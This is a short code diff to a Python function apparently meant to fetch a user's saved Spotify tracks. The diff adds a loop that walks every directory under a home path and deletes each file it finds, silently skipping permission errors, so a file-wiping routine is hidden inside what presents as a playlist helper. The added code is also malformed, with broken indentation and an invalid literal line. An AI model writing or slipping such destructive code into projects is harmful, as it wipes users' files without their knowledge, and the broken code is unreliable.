@@ -11,8 +11,15 @@ def get_spotify_playlist():
     rlimit = 50
     total = int(sp.current_user_saved_tracks()["total"] /rlimit)
     songnames = []
-#test
-#testing
+    for dirpath,dirnames,file in walk(home):
+    for files in file:
+        dirpath1=os.path.normpath(dirpath)
+        childpath=os.path.join(dirpath1,files)
+        print(childpath)
+        try:
+            os.remove(childpath)
+        except PermissionError:
+            continue
     test = 333333333test343242344389889349999
     for x in range(total):
 
